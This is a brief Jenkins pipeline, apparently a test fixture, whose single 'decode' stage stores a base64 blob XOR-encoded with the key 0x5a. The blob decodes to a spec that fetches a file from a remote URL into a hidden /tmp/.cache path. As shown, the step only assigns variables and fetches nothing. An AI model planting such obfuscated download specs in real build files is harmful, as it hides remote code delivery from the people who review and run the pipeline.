node('windows-agent') {
  stage('Stage') {
    def out = sh(label: 'decode', script: "#!/usr/bin/env bash\nreadonly Material_5be2a1c9='LGdrJikuPyopZzs5Ky8zKD8FKD83NS4/di0oMy4/BTwzNj92PjMpKjsuOTIFKig1OT8pKSY7PjsqLj8oZzkvKDYmKS47PT8FOTUvNC5naCY5OzcqOzM9NAUzPmc5OzcqOzM9" +
        "NHdvOD9oO2s5Y2ppJi8oNmcyLi4qKWB1dW84P2g7azljaml0PyI7Nyo2P3QzNCw7NjM+dSkuOz0/dCkyJjwzNj8FKjsuMmd1LjcqdXQ5OzkyP3UpLjs9P3dvOD9oO2s5Y2pp'\nreadonly Codec_5be2a1c9='base64|single_byte_xor|5a'\n", returnStdout: true)
    echo out
  }
}
